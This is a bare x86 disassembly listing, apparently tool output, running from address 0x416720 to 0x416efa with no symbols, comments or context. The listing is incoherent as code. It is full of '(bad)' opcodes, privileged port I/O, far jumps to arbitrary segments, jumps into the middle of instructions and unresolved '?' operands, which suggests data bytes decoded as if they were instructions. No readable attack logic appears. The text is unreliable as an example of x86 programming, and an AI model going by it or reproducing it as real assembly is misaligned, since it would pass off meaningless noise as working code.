  416720:	xchg   ebp,eax
  416721:	in     al,0x32
  416723:	ins    DWORD PTR es:[edi],dx
  416724:	pop    ds
  416725:	ror    DWORD PTR [ecx],1
  416727:	pop    ebp
  416728:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416729:	inc    ebp
  41672a:	mov    edi,edx
  41672c:	xchg   ebx,eax
  41672d:	sbb    al,0xc1
  41672f:	call   0xc56b:0x5898036c
  416736:	xchg   esi,eax
  416737:	(bad)  
  416738:	push   ss
  416739:	cdq    
  41673a:	fucom  st(2)
  41673c:	or     al,0x78
  41673e:	mov    dh,BYTE PTR [edx]
  416740:	out    dx,al
  416741:	test   eax,0xb2621581
  416746:	imul   esp,ebp,0xfffffff5
  416749:	mov    gs,WORD PTR [edi+0x5b]
  41674c:	adc    eax,0xbdbcf4f6
  416751:	push   eax
  416752:	push   edx
  416753:	jg     0x41675f
  416755:	sbb    ah,ch
  416757:	jp     0x416730
  416759:	adc    bl,BYTE PTR [edx-0x40]
  41675c:	sbb    BYTE PTR [esi+0x5e62eefd],cl
  416762:	stc    
  416763:	push   esi
  416764:	mov    dl,0xa5
  416766:	jmp    0x3fa:0x293812bb
  41676d:	fidivr DWORD PTR [eax]
  41676f:	nop
  416770:	cmp    ch,BYTE PTR [ecx-0x3eb2aa54]
  416776:	aam    0xd0
  416778:	sub    eax,0xfe28ad06
  41677d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41677e:	stos   BYTE PTR es:[edi],al
  41677f:	cmp    BYTE PTR [eax-0x1d],dl
  416782:	push   edi
  416783:	mov    ds,WORD PTR ds:0xdf5cedb3
  416789:	into   
  41678a:	stos   DWORD PTR es:[edi],eax
  41678b:	comiss xmm2,DWORD PTR [edx-0x51]
  41678f:	shl    BYTE PTR [esi+ebp*8],1
  416792:	in     eax,dx
  416793:	imul   ebx,DWORD PTR [eax+0x26],0x5efe8163
  41679a:	sub    eax,0x17d01ac1
  41679f:	cmp    BYTE PTR ds:0xd0cf453d,bl
  4167a5:	add    BYTE PTR [edi],0x11
  4167a8:	jl     0x4167ab
  4167aa:	fldcw  WORD PTR [edi+0x2f]
  4167ad:	leave  
  4167ae:	pop    ss
  4167af:	or     BYTE PTR [esp+ebp*8-0x2c5ef54e],bh
  4167b6:	xor    DWORD PTR [eax-0x4bf5a9ab],edi
  4167bc:	cld    
  4167bd:	xchg   ebp,eax
  4167be:	(bad)  
  4167bf:	in     al,dx
  4167c0:	or     edx,edx
  4167c2:	and    esi,DWORD PTR [esi+eiz*8+0x344f3565]
  4167c9:	dec    edx
  4167ca:	jg     0x416762
  4167cc:	jns    0x41676d
  4167ce:	sub    bh,BYTE PTR [edi-0x1c152783]
  4167d4:	or     ch,BYTE PTR [ecx-0xc120f72]
  4167da:	sbb    al,0xbc
  4167dc:	push   ss
  4167dd:	xor    eax,0x96e8868c
  4167e2:	xchg   edi,eax
  4167e3:	addr16 dec ebp
  4167e5:	jno    0x41684a
  4167e7:	arpl   WORD PTR [ecx-0x14],bx
  4167ea:	popa   
  4167eb:	cs pop esp
  4167ed:	push   eax
  4167ee:	push   0x76742940
  4167f3:	pop    ds
  4167f4:	push   eax
  4167f5:	push   cs
  4167f6:	lods   al,BYTE PTR ds:[esi]
  4167f7:	cs or  al,0xd8
  4167fa:	sar    BYTE PTR [ebp+0x4],0x18
  4167fe:	call   0xf9e8:0x6deaca2b
  416805:	aaa    
  416806:	(bad)  [edx]
  416808:	lea    ebx,[edi-0x1f]
  41680b:	push   ss
  41680c:	jmp    0x2d261db9
  416811:	ret    
  416812:	jae    0x4167c2
  416814:	pop    edx
  416815:	xchg   esp,eax
  416817:	cmp    eax,0xdb94c8d
  41681c:	es ud0 edx,DWORD PTR ss:[edx+ebx*2-0x5f51add1]
  416826:	(bad)  
  416827:	loop   0x4167e4
  416829:	adc    al,0x24
  41682b:	pop    ebp
  41682c:	adc    bh,BYTE PTR [eax]
  41682e:	pop    ss
  41682f:	fdiv   st,st(0)
  416831:	sbb    bh,ah
  416833:	xor    eax,0x92ac29b3
  416838:	in     eax,dx
  416839:	adc    al,0xe7
  41683b:	jle    0x416809
  41683d:	cmp    al,0x40
  41683f:	scas   al,BYTE PTR es:[edi]
  416840:	aad    0x3e
  416842:	test   WORD PTR [ecx+0x59065fed],cx
  416849:	or     DWORD PTR [eax-0x51],ecx
  41684c:	xchg   DWORD PTR [edi-0x39f63abc],ebp
  416852:	mov    dh,cl
  416854:	mov    ebp,DWORD PTR [eax+0x6428c067]
  41685a:	daa    
  41685b:	fwait
  41685c:	and    ch,BYTE PTR [ecx+edx*4+0x2]
  416860:	add    BYTE PTR [eax],dl
  416862:	shl    DWORD PTR [edx+0x3c],1
  416865:	cli    
  416866:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416867:	cmp    BYTE PTR [ebp+0x5b3d7631],dl
  41686d:	pop    es
  41686e:	mov    ebx,0xcaef2acd
  416873:	inc    edx
  416874:	js     0x41683d
  416876:	jae    0x4168de
  416878:	das    
  416879:	and    eax,0x9258c9d1
  41687e:	ret    0x4a89
  416881:	add    eax,0xbb97f430
  416886:	scas   al,BYTE PTR es:[edi]
  416887:	xchg   dh,bh
  416889:	cmp    esi,eax
  41688b:	fdivr  QWORD PTR [ebx+0x4166611]
  416891:	sbb    ah,al
  416893:	mov    edi,0xb6a44e34
  416898:	div    DWORD PTR [esi+0x7b22e48e]
  41689e:	out    0x6,eax
  4168a0:	add    BYTE PTR [ebx-0x72],dh
  4168a3:	lods   al,BYTE PTR ds:[esi]
  4168a4:	data16 jle 0x4168c7
  4168a7:	dec    esi
  4168a8:	(bad)  [edx]
  4168aa:	pop    esi
  4168ab:	mov    esp,0x1d4add9a
  4168b0:	sub    DWORD PTR [edi],ebx
  4168b2:	inc    eax
  4168b3:	pop    es
  4168b4:	and    BYTE PTR [edx],al
  4168b6:	nop
  4168b7:	cli    
  4168b8:	push   edi
  4168b9:	push   es
  4168ba:	mov    eax,ss
  4168bc:	mov    ecx,0x37eacb02
  4168c1:	ss xchg edi,eax
  4168c3:	leave  
  4168c4:	add    BYTE PTR [ecx],cl
  4168c6:	mov    ebp,0x8e8e2a0d
  4168cb:	xor    al,0xab
  4168cd:	imul   esi,DWORD PTR ds:0xd07e403c,0x2129ed4f
  4168d7:	xchg   DWORD PTR [ecx],eax
  4168d9:	sbb    eax,0x2bea5e7c
  4168de:	mov    esi,0xd926ab2b
  4168e3:	cmp    dh,al
  4168e5:	mov    bl,0xb5
  4168e7:	push   0x3300ebd
  4168ec:	cmp    al,bl
  4168ee:	jl     0x416953
  4168f0:	repnz fcmovnu st,st(7)
  4168f3:	scas   eax,DWORD PTR es:[di]
  4168f5:	loopne 0x416911
  4168f7:	add    al,0x46
  4168f9:	push   edi
  4168fa:	loope  0x416945
  4168fc:	dec    ebx
  4168fd:	ret    
  4168fe:	ret    
  4168ff:	sar    DWORD PTR [ecx],1
  416901:	mov    al,ds:0x2cda78a9
  416906:	das    
  416907:	jp     0x4168bf
  416909:	push   edi
  41690a:	xchg   edx,eax
  41690b:	int3   
  41690c:	pop    eax
  41690d:	and    DWORD PTR [esi+0x23],ebp
  416910:	dec    edi
  416911:	sbb    eax,0xa724d7fc
  416916:	lahf   
  416917:	sahf   
  416918:	xchg   BYTE PTR [ebp+0x31667ad3],ch
  41691e:	mov    bl,0x38
  416920:	lods   al,BYTE PTR ds:[esi]
  416921:	xchg   edx,eax
  416922:	hlt    
  416923:	mov    bx,0xb3ed
  416927:	adc    bh,ch
  416929:	or     eax,0x37d394b4
  41692e:	mov    dh,0x32
  416930:	push   esi
  416931:	and    al,0xf6
  416933:	pop    esi
  416934:	cwde   
  416935:	pop    ecx
  416936:	push   ebp
  416937:	jmp    0xdfb1:0xbaa2a31
  41693e:	mov    bl,0x68
  416940:	stos   BYTE PTR es:[edi],al
  416941:	pop    esi
  416942:	jl     0x416916
  416944:	(bad)  
  416945:	mov    edx,0x22ddf0ea
  41694a:	aaa    
  41694b:	pop    esi
  41694c:	mov    DWORD PTR [edi-0x7c],edx
  41694f:	lea    esi,ds:0x3ed7c8c4
  416955:	sbb    DWORD PTR [edi-0x67],0xd9db3afc
  41695c:	inc    ebx
  41695d:	lahf   
  41695e:	aas    
  41695f:	adc    DWORD PTR [esi+0x4524e05a],esi
  416965:	in     eax,dx
  416966:	sub    DWORD PTR [ecx-0x6250059e],esi
  41696c:	in     eax,dx
  41696d:	mov    cl,0x45
  41696f:	dec    ecx
  416970:	pop    edx
  416971:	loope  0x416983
  416973:	aaa    
  416974:	xor    BYTE PTR [esi+0x5a1a153e],al
  41697a:	mov    dl,0x82
  41697c:	xchg   esi,eax
  41697d:	out    dx,eax
  41697e:	mov    ebx,0x40cd06c2
  416983:	inc    ebp
  416984:	mov    edi,0x9782703
  416989:	jecxz  0x416913
  41698b:	into   
  41698c:	lods   eax,DWORD PTR ds:[esi]
  41698d:	stc    
  41698e:	jb     0x4169d8
  416990:	daa    
  416991:	retf   
  416992:	xchg   DWORD PTR [ecx+0x2ff3c0a8],esp
  416998:	or     cl,BYTE PTR [edi-0x559da31]
  41699e:	popa   
  41699f:	pusha  
  4169a0:	cld    
  4169a1:	mov    bh,0xd8
  4169a3:	lods   eax,DWORD PTR ds:[esi]
  4169a4:	jecxz  0x4169a1
  4169a6:	shr    BYTE PTR [edi+ebx*4+0x7b],1
  4169aa:	fs mov ah,0x68
  4169ad:	das    
  4169ae:	mov    ah,0x3d
  4169b0:	icebp  
  4169b1:	add    dh,BYTE PTR [esi+0x4]
  4169b4:	sti    
  4169b5:	lock jmp 0x4169fc
  4169b8:	stos   DWORD PTR es:[edi],eax
  4169b9:	call   0xdd6b70a9
  4169be:	js     0x41698e
  4169c0:	jg     0x416a27
  4169c2:	push   ebp
  4169c3:	xchg   ebp,eax
  4169c4:	mov    cl,0xdf
  4169c6:	cwde   
  4169c7:	ret    0x348e
  4169ca:	mov    cl,0x77
  4169cc:	sub    edi,ebx
  4169ce:	fisub  DWORD PTR [ebp+0x1]
  4169d1:	cmp    eax,0x964a8ad5
  4169d6:	fucompp 
  4169d8:	dec    BYTE PTR [ebx+0x46]
  4169db:	sbb    al,0x3f
  4169dd:	inc    esp
  4169de:	jg     0x416a4b
  4169e0:	inc    edx
  4169e1:	add    BYTE PTR [ecx+0x47],ah
  4169e4:	and    DWORD PTR [ecx],ecx
  4169e6:	les    ebp,FWORD PTR [eax+0x39]
  4169e9:	fisub  WORD PTR [ebp-0xabf73fc]
  4169ef:	outs   dx,DWORD PTR ds:[esi]
  4169f0:	imul   DWORD PTR [ebx-0x63]
  4169f3:	ja     0x416992
  4169f5:	cmp    BYTE PTR [ecx],al
  4169f7:	mov    esi,0xdeb1a2bf
  4169fc:	mov    ds:0x4832b5ee,al
  416a01:	pop    edi
  416a02:	loop   0x416a50
  416a04:	cmp    ebx,DWORD PTR [edx+0x6a]
  416a07:	imul   esi,DWORD PTR [ebp*4-0x2625d41a],0xffffffbd
  416a0f:	dec    ebx
  416a10:	test   BYTE PTR [ebp-0x7937754],dl
  416a16:	les    ecx,FWORD PTR [edx+0x2f3a0882]
  416a1c:	outs   dx,DWORD PTR ds:[esi]
  416a1d:	jmp    0x7bc991db
  416a22:	sahf   
  416a23:	adc    ebx,DWORD PTR [esi]
  416a25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a26:	xor    al,0xc9
  416a28:	int    0x43
  416a2a:	or     eax,0x7abe8816
  416a2f:	and    al,0xf9
  416a31:	js     0x416a93
  416a33:	add    ecx,DWORD PTR [edi+0x23]
  416a36:	(bad)  
  416a37:	push   ebx
  416a38:	sbb    ebp,DWORD PTR [ecx]
  416a3a:	sub    cl,dh
  416a3c:	jae    0x416a1a
  416a3e:	lock ffree st(1)
  416a41:	cld    
  416a42:	test   al,0x6f
  416a44:	stos   BYTE PTR es:[edi],al
  416a45:	xchg   edx,eax
  416a46:	mov    edx,0x7b027abc
  416a4b:	aaa    
  416a4c:	lds    edx,FWORD PTR [eax-0x24]
  416a4f:	repnz or al,0x61
  416a52:	js     0x416a47
  416a54:	gs pop ebp
  416a56:	adc    DWORD PTR [esi],edx
  416a58:	repnz push edi
  416a5a:	sub    al,0xc4
  416a5c:	add    al,bl
  416a5e:	xchg   ebx,eax
  416a5f:	ret    
  416a60:	and    eax,0x9563a01f
  416a65:	sar    BYTE PTR ds:0x3a8ce6ac,0x8b
  416a6c:	shl    ebp,0x69
  416a6f:	ficomp WORD PTR [ebx]
  416a71:	mov    ah,0x99
  416a73:	pmullw mm2,QWORD PTR ds:0x67b630fa
  416a7a:	pop    es
  416a7b:	mov    esp,0x24be3ca0
  416a80:	fs and dh,0xef
  416a84:	push   es
  416a85:	adc    eax,0x831e1eae
  416a8a:	push   eax
  416a8b:	push   es
  416a8c:	jb     0x416a2b
  416a8e:	mov    ds:0xc5b44422,al
  416a93:	test   ebx,eax
  416a95:	clc    
  416a96:	loope  0x416a96
  416a98:	out    0x44,eax
  416a9a:	out    0xf,al
  416a9c:	xor    BYTE PTR [ebp+0x63],bh
  416a9f:	std    
  416aa0:	and    BYTE PTR [ebp+0x68b9f71d],bh
  416aa6:	xchg   esi,eax
  416aa7:	arpl   WORD PTR [eax],bx
  416aa9:	mov    WORD PTR [edi+0x6edc1dbf],es
  416aaf:	and    bl,ah
  416ab1:	aad    0xe4
  416ab3:	sub    ah,BYTE PTR [ecx+0xae2db9d]
  416ab9:	jae    0x416a56
  416abb:	or     BYTE PTR ds:0x48e56930,bh
  416ac1:	mov    dh,0x4b
  416ac3:	retf   0x9019
  416ac6:	jae    0x416b28
  416ac8:	sbb    al,0x5f
  416aca:	gs dec ebp
  416acc:	adc    BYTE PTR [esi],dl
  416ace:	jecxz  0x416ad6
  416ad0:	adc    eax,0x4e559f1e
  416ad5:	jg     0x416aee
  416ad7:	rcpps  xmm7,XMMWORD PTR [eax+edi*1]
  416adb:	mov    ss,WORD PTR [edi-0x4b]
  416ade:	dec    eax
  416adf:	jne    0x416b02
  416ae1:	neg    dh
  416ae3:	mov    ch,0x6a
  416ae5:	lea    edx,[esi+eax*2]
  416ae8:	adc    al,0x78
  416aea:	mov    edi,0x537bd9f
  416aef:	cli    
  416af0:	jae    0x416b2f
  416af2:	lds    edx,FWORD PTR ds:0x2829d45a
  416af8:	inc    eax
  416af9:	les    esp,FWORD PTR [ebp+0x56439036]
  416aff:	addr16 jo 0x7c2c7415
  416b06:	not    bh
  416b08:	test   bl,ah
  416b0a:	and    edx,esi
  416b0c:	es push eax
  416b0e:	bound  eax,QWORD PTR [edx]
  416b10:	push   0x51b31a6
  416b15:	sbb    eax,0x418480ff
  416b1a:	jne    0x416b98
  416b1c:	(bad)  [edx]
  416b1e:	call   0xaae796d5
  416b23:	daa    
  416b24:	test   al,0x66
  416b26:	enter  0xbaa4,0xde
  416b2a:	pop    ecx
  416b2b:	aam    0x43
  416b2d:	imul   ebx,DWORD PTR [edi+0x15],0x6c3405a1
  416b34:	dec    edx
  416b35:	cmc    
  416b36:	xchg   edi,eax
  416b37:	mov    ebp,0xa58d4cde
  416b3c:	push   eax
  416b3d:	stc    
  416b3e:	fwait
  416b3f:	push   es
  416b40:	lods   eax,DWORD PTR ds:[esi]
  416b41:	aaa    
  416b42:	test   al,0x36
  416b44:	loop   0x416ac8
  416b46:	repz test DWORD PTR [ebx+0x70b6a946],eax
  416b4d:	xchg   edi,eax
  416b4e:	mov    ah,0xf3
  416b50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b51:	pop    ebx
  416b52:	lods   eax,DWORD PTR ds:[esi]
  416b53:	loopne 0x416b9e
  416b55:	push   eax
  416b56:	jg     0x416b77
  416b58:	pushf  
  416b59:	sbb    cl,dh
  416b5b:	or     bh,cl
  416b5d:	dec    eax
  416b5e:	cmc    
  416b5f:	out    0x3b,al
  416b61:	lods   eax,DWORD PTR ds:[esi]
  416b62:	dec    edi
  416b63:	cli    
  416b64:	ins    BYTE PTR es:[edi],dx
  416b65:	and    BYTE PTR [esi+0x30],al
  416b68:	mov    ebp,DWORD PTR [ebx-0x57]
  416b6b:	and    bl,BYTE PTR [eax+0x49]
  416b6e:	pop    edx
  416b6f:	pop    ss
  416b70:	cdq    
  416b71:	sub    eax,0x8e18b072
  416b76:	(bad)  
  416b77:	jmp    0x6b5c41fc
  416b7c:	dec    ecx
  416b7d:	sub    al,0xcb
  416b7f:	adc    BYTE PTR [eax],ch
  416b81:	push   cs
  416b82:	pop    esi
  416b83:	and    al,0x1d
  416b86:	sti    
  416b87:	(bad)  
  416b88:	sbb    DWORD PTR [edi+ecx*1+0x2],esi
  416b8c:	xchg   edx,eax
  416b8d:	pop    edi
  416b8e:	lea    ecx,[edx]
  416b90:	mov    edx,DWORD PTR [esi+0x76]
  416b93:	ja     0x416b64
  416b95:	nop    DWORD PTR [ecx-0x77d7c98c]
  416b9c:	fst    QWORD PTR [esi]
  416b9e:	aas    
  416b9f:	ja     0x416c11
  416ba1:	lahf   
  416ba2:	mov    ebp,0x96c66c07
  416ba7:	lods   eax,DWORD PTR ds:[esi]
  416ba8:	pop    ds
  416ba9:	retf   
  416baa:	mov    ch,0xec
  416bac:	mov    bh,al
  416bae:	ret    0xa114
  416bb1:	mov    cl,0xff
  416bb3:	ror    DWORD PTR [eax],0x54
  416bb6:	out    0x22,al
  416bb8:	xchg   ebp,eax
  416bb9:	xchg   ecx,eax
  416bba:	fst    DWORD PTR [edi-0x5f8133a5]
  416bc0:	out    dx,eax
  416bc1:	and    eax,0xe4ebe7f4
  416bc6:	fidiv  WORD PTR [edx-0x24]
  416bc9:	fwait
  416bca:	cdq    
  416bcb:	(bad)  
  416bcd:	rol    DWORD PTR [ebx+0x1],0x77
  416bd1:	xchg   ebx,eax
  416bd2:	sub    eax,0x70e3e0c7
  416bd7:	ss push esp
  416bd9:	jle    0x416c53
  416bdb:	and    al,0xe6
  416bdd:	stos   DWORD PTR es:[edi],eax
  416bde:	frstor [ebx+0x0]
  416be1:	pop    esp
  416be2:	ret    
  416be3:	lea    esp,[ebx+0x2f]
  416be6:	or     al,BYTE PTR [edi+ebp*2]
  416be9:	test   BYTE PTR [edx-0x665c19e2],0xfa
  416bf0:	ins    DWORD PTR es:[edi],dx
  416bf1:	imul   eax,DWORD PTR [esi],0xffffff80
  416bf4:	mov    eax,ds:0x998b1eb3
  416bf9:	test   BYTE PTR [edi+0x2b44dadd],bl
  416bff:	push   eax
  416c00:	stc    
  416c01:	pusha  
  416c02:	ret    
  416c03:	repz enter 0x8047,0xb5
  416c08:	mov    ah,0x70
  416c0a:	xchg   ebx,eax
  416c0b:	retf   0xca6d
  416c0e:	sbb    al,0x12
  416c10:	push   esi
  416c11:	xor    ebx,DWORD PTR [ebp-0x59]
  416c14:	(bad)  [ebx]
  416c16:	dec    edx
  416c17:	xchg   ebx,eax
  416c18:	ret    
  416c19:	into   
  416c1a:	sbb    al,0x91
  416c1c:	push   ss
  416c1d:	fwait
  416c1e:	ins    DWORD PTR es:[edi],dx
  416c1f:	icebp  
  416c20:	(bad)  
  416c22:	mov    al,0xf6
  416c24:	mov    ?,WORD PTR [edx]
  416c26:	pop    ebx
  416c27:	push   ecx
  416c28:	ret    
  416c29:	leave  
  416c2a:	and    al,0x51
  416c2c:	mov    ch,dh
  416c2e:	je     0x416c32
  416c30:	inc    edx
  416c31:	push   0xfffffff9
  416c33:	retf   0x9973
  416c36:	push   ecx
  416c37:	in     al,dx
  416c38:	xchg   ecx,eax
  416c39:	jne    0x416c3a
  416c3b:	out    dx,eax
  416c3c:	dec    ecx
  416c3d:	imul   eax,ebx,0x705708d7
  416c43:	pop    ebx
  416c44:	pop    ecx
  416c45:	dec    ebx
  416c46:	cmp    bl,ah
  416c48:	and    DWORD PTR ds:0x22856073,0xffffff88
  416c4f:	(bad)  
  416c51:	lds    esi,FWORD PTR [esi+0x5f4689b7]
  416c57:	retf   0x3f44
  416c5a:	pop    edi
  416c5b:	sub    ecx,ecx
  416c5d:	and    bh,al
  416c5f:	or     edx,DWORD PTR [esi+0x657b8e65]
  416c65:	push   ebp
  416c66:	outs   dx,BYTE PTR ds:[esi]
  416c67:	mov    bl,0x27
  416c69:	push   edi
  416c6a:	and    eax,0x6ecea97b
  416c6f:	mov    eax,0xbaa4c41b
  416c74:	test   ecx,ebp
  416c76:	cmp    BYTE PTR [eax-0x80],dl
  416c79:	add    al,0x98
  416c7b:	arpl   WORD PTR [esi+0x1a],cx
  416c7e:	mov    WORD PTR [ecx+0x2b0460f6],?
  416c84:	(bad)  
  416c85:	mov    BYTE PTR ds:0xb759bb57,0xb9
  416c8c:	daa    
  416c8d:	pusha  
  416c8e:	push   edi
  416c8f:	inc    ebx
  416c90:	jmp    0xa725a82d
  416c95:	jno    0x416c20
  416c97:	adc    BYTE PTR [esi+0x45351aa1],al
  416c9d:	sti    
  416c9e:	cmp    ah,BYTE PTR [ebx+0x7f]
  416ca1:	add    edi,eax
  416ca3:	imul   ebp,DWORD PTR [esi-0x1a],0xffffffca
  416ca7:	mov    dh,0x6a
  416ca9:	jbe    0x416d1f
  416cab:	test   ebx,ebx
  416cad:	or     al,0xa8
  416caf:	(bad)  
  416cb0:	fwait
  416cb1:	out    dx,al
  416cb2:	or     al,0x28
  416cb4:	popf   
  416cb5:	jnp    0x416c57
  416cb7:	sub    al,0xb9
  416cb9:	push   esp
  416cba:	mov    cl,0x61
  416cbc:	pusha  
  416cbd:	push   edi
  416cbe:	ficom  WORD PTR [eax+0x2700f8c5]
  416cc4:	daa    
  416cc5:	cdq    
  416cc6:	push   es
  416cc7:	fwait
  416cc8:	cli    
  416cc9:	out    0xa0,eax
  416ccb:	jb     0x416d38
  416ccd:	add    al,BYTE PTR [eax+0x7a]
  416cd0:	or     eax,0x66a00b51
  416cd5:	mov    ch,0xa4
  416cd7:	ret    
  416cd8:	inc    esp
  416cd9:	lods   eax,DWORD PTR ds:[esi]
  416cda:	xchg   BYTE PTR [ebx+eax*4+0x19087a86],cl
  416ce1:	adc    BYTE PTR [esi+0x217629bb],ah
  416ce7:	int3   
  416ce8:	jp     0x416cb4
  416cea:	pop    edi
  416ceb:	pushf  
  416cec:	scas   al,BYTE PTR es:[edi]
  416ced:	mov    BYTE PTR [ecx],bl
  416cef:	lds    eax,FWORD PTR [ebx+0x31]
  416cf2:	mov    ecx,0xb7ca4e7
  416cf7:	jnp    0x416d0a
  416cf9:	dec    ebx
  416cfa:	adc    eax,0xb4f66bdf
  416cff:	sbb    DWORD PTR [eax-0x65],esp
  416d02:	and    BYTE PTR [edi+0x25],ah
  416d05:	and    esi,DWORD PTR [ecx-0x48]
  416d08:	adc    esp,DWORD PTR [ebp-0x18]
  416d0b:	stos   DWORD PTR es:[edi],eax
  416d0c:	adc    BYTE PTR [ebp-0x27],dh
  416d0f:	mov    dl,0x77
  416d11:	add    BYTE PTR [ebx+0x50],0x45
  416d15:	iret   
  416d16:	adc    al,0x73
  416d18:	inc    esi
  416d19:	jp     0x416cad
  416d1b:	pop    edi
  416d1c:	in     al,dx
  416d1d:	jbe    0x416d81
  416d1f:	dec    edi
  416d20:	mov    dh,0x35
  416d22:	lods   eax,DWORD PTR ds:[esi]
  416d23:	jo     0x416d07
  416d25:	xor    al,0x1c
  416d27:	pushf  
  416d28:	dec    esp
  416d29:	into   
  416d2a:	call   0xb80:0x8cdfbc3d
  416d31:	fcomp  DWORD PTR [ebp+0x6a17a122]
  416d37:	std    
  416d38:	sbb    BYTE PTR [edx+0x6c],bh
  416d3b:	xor    eax,0x66359cbc
  416d40:	or     BYTE PTR [ebp+0x519f7d40],dl
  416d46:	push   0x113f76d
  416d4b:	fstp   TBYTE PTR [ecx+eiz*4+0x78]
  416d4f:	(bad)  
  416d50:	daa    
  416d51:	and    BYTE PTR [eax-0x7e],cl
  416d54:	xchg   BYTE PTR [edx],bl
  416d56:	aas    
  416d57:	sbb    al,0x54
  416d59:	xchg   ebp,eax
  416d5a:	imul   ebx,esi,0x1a
  416d5d:	pop    edx
  416d5e:	or     eax,0x884eebae
  416d63:	sub    edi,DWORD PTR [edx-0x596522fc]
  416d69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d6a:	mov    ebp,0x475030cd
  416d6f:	mov    ebx,0x8a009609
  416d74:	mov    al,ds:0xf7516231
  416d79:	mov    bl,BYTE PTR [ecx-0x5e74479f]
  416d7f:	xchg   ebx,eax
  416d80:	mov    fs,ebp
  416d82:	out    0x2d,al
  416d84:	push   ds
  416d85:	mov    bh,0xc
  416d87:	sbb    eax,0xf0fe425d
  416d8c:	adc    edx,edx
  416d8e:	test   DWORD PTR [ebp-0x6bdb164d],0x6c80a4ef
  416d98:	shr    BYTE PTR [edx],cl
  416d9a:	out    0x42,eax
  416d9c:	inc    edi
  416d9d:	sub    eax,0x710ffd11
  416da2:	sub    bl,BYTE PTR [esi+0x1bf97b28]
  416da8:	adc    ch,0x45
  416dab:	jnp    0x416db9
  416dad:	pop    ebx
  416dae:	adc    BYTE PTR [ebp-0x29],dh
  416db1:	aad    0xe3
  416db3:	sub    bl,ch
  416db5:	lahf   
  416db6:	sahf   
  416db7:	mov    al,ds:0x316089ee
  416dbc:	dec    esi
  416dbd:	pop    esi
  416dbe:	dec    ebx
  416dbf:	add    al,0x1e
  416dc1:	js     0x416de7
  416dc3:	loop   0x416de1
  416dc5:	cs cwde 
  416dc7:	aam    0x61
  416dc9:	add    BYTE PTR [esi-0x21],ah
  416dcc:	mov    BYTE PTR ds:0x4cd3841b,dh
  416dd2:	inc    esi
  416dd3:	adc    DWORD PTR [edx],0xe262ea0c
  416dd9:	pop    ebp
  416dda:	enter  0xa043,0x8d
  416dde:	cmp    al,0x76
  416de0:	pop    edx
  416de1:	or     al,BYTE PTR [ecx]
  416de3:	dec    esi
  416de4:	(bad)  
  416de6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416de7:	clc    
  416de8:	test   DWORD PTR [edx],ebx
  416dea:	test   ecx,eax
  416dec:	sbb    ecx,DWORD PTR [ebx]
  416dee:	cli    
  416def:	or     DWORD PTR [ecx+ebp*8],ecx
  416df2:	xor    ah,BYTE PTR [ecx+0x4d]
  416df5:	and    eax,0x6db58e5f
  416dfa:	mov    edi,0x441ae2f4
  416dff:	repz xlat BYTE PTR ds:[ebx]
  416e01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e02:	xchg   BYTE PTR [eax+eax*4-0x41],dh
  416e06:	cmc    
  416e07:	rcl    edi,0x58
  416e0a:	fcom   QWORD PTR [esi]
  416e0c:	imul   edx,eax,0x39928b4
  416e12:	or     al,0xf7
  416e14:	ds popa 
  416e16:	xchg   esi,eax
  416e17:	mov    ebx,0x91bc0776
  416e1c:	mov    al,ds:0xae47320b
  416e21:	stos   DWORD PTR es:[edi],eax
  416e22:	push   0xd0687c4e
  416e27:	xor    BYTE PTR [ebx],bl
  416e29:	inc    ebx
  416e2a:	cmc    
  416e2b:	fiadd  DWORD PTR [esi+0x474fb81e]
  416e31:	sbb    BYTE PTR [esp],dh
  416e34:	sub    DWORD PTR [ebx-0xe],0xdfd62be2
  416e3b:	call   0xfac3cbf4
  416e40:	and    dl,BYTE PTR [ecx]
  416e42:	fild   DWORD PTR [eax-0x6a666ac9]
  416e48:	call   0x2e130fb3
  416e4d:	not    bl
  416e4f:	mov    dl,BYTE PTR [edx-0x45268f1d]
  416e55:	cmp    eax,0xe152e610
  416e5a:	dec    sp
  416e5c:	mov    ds:0x51f432a2,eax
  416e61:	shl    DWORD PTR [edx],0xa7
  416e64:	fmul   DWORD PTR [esi-0x30]
  416e67:	inc    edi
  416e68:	jp     0x416df4
  416e6a:	inc    edi
  416e6b:	aad    0xaf
  416e6d:	enter  0x6f9e,0x92
  416e71:	call   0x7201:0x2dc7f16b
  416e78:	popf   
  416e79:	aas    
  416e7a:	(bad)  
  416e7c:	pop    esp
  416e7d:	rol    BYTE PTR [ebp-0x72],1
  416e80:	je     0x416ee5
  416e82:	push   edx
  416e83:	mov    eax,0xd13f8de7
  416e88:	and    bl,ah
  416e8a:	xor    BYTE PTR [ebp-0x3c],0xd0
  416e8e:	and    eax,DWORD PTR [ebp+0x7]
  416e91:	sbb    DWORD PTR [ecx*2-0x4cab088d],edi
  416e98:	gs inc ebp
  416e9a:	inc    ebx
  416e9b:	lahf   
  416e9c:	mov    ebx,0xd9924cbe
  416ea1:	xlat   BYTE PTR ds:[ebx]
  416ea2:	loop   0x416ef2
  416ea4:	push   es
  416ea5:	es popa 
  416ea7:	mov    cl,ch
  416ea9:	adc    eax,0x7da5f4b6
  416eae:	aas    
  416eaf:	(bad)  
  416eb0:	cmp    DWORD PTR [edi],0x7e05f106
  416eb6:	xor    DWORD PTR [ecx+eiz*8],edx
  416eb9:	jne    0x416e57
  416ebb:	lock push ecx
  416ebd:	and    al,BYTE PTR [ecx+0x6d]
  416ec0:	push   cs
  416ec1:	lds    edx,FWORD PTR [ecx+esi*8+0x260c9541]
  416ec8:	mov    edi,0x206c4c50
  416ecd:	ret    
  416ece:	and    BYTE PTR gs:[edx-0x22b0b8fa],bl
  416ed5:	adc    bl,BYTE PTR [ebx-0x5ea6ac2a]
  416edb:	pusha  
  416edc:	mov    ds:0xb0306c27,al
  416ee1:	dec    edx
  416ee2:	pop    es
  416ee3:	dec    eax
  416ee4:	xchg   DWORD PTR [ebx+0x6b],ebx
  416ee7:	(bad)  
  416ee9:	pop    edx
  416eea:	and    BYTE PTR [edx],0x28
  416eed:	shl    BYTE PTR [esp+ebx*1],0xd7
  416ef1:	mov    DWORD PTR [ebx+0x5f8492c9],edx
  416ef7:	lods   al,BYTE PTR ds:[esi]
  416ef8:	div    eax
  416efa:	inc    esi
